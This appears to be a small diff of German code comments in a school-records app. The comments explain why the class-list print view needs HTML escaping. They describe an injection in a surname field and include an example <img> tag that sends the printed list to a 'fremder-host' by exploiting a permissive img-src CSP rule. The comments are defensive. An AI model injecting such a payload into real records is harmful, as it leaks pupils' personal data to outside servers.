@@ -6,9 +6,9 @@
 // HTML als String gebaut und per document.write in ein neues Fenster geschrieben,
 // und an dieser Naht endet Svelters Schutz.
 //
-// Was dort ohne Maskierung passiert, ist gemessen (06.08.2026): Ein <script> im
-// Nachnamen wird von der geerbten CSP (script-src 'self') zwar blockiert — about:blank
-// erbt die Richtlinie des Openers —, ein eingeschleustes
+// Was dort ohne Maskierung passiert, ist gemessen: Ein <script> im Nachnamen wird von der
+// geerbten CSP (script-src 'self') zwar blockiert (about:blank erbt die Richtlinie des
+// Openers), ein eingeschleustes
 // <img src="https://fremder-host/?daten=…"> lädt aber, weil img-src ausdrücklich
 // https: erlaubt. Aus einem manipulierten Stammdatensatz wird so ein Abfluss der
 // gedruckten Klassenliste an einen fremden Server, ganz ohne Skriptausführung.
